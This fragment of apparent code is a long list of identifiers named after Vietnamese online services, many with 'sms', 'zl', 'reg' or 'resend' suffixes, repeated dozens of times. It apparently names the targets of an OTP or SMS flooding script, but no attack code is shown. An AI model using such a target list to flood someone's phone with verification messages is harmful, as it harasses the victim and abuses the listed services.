    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
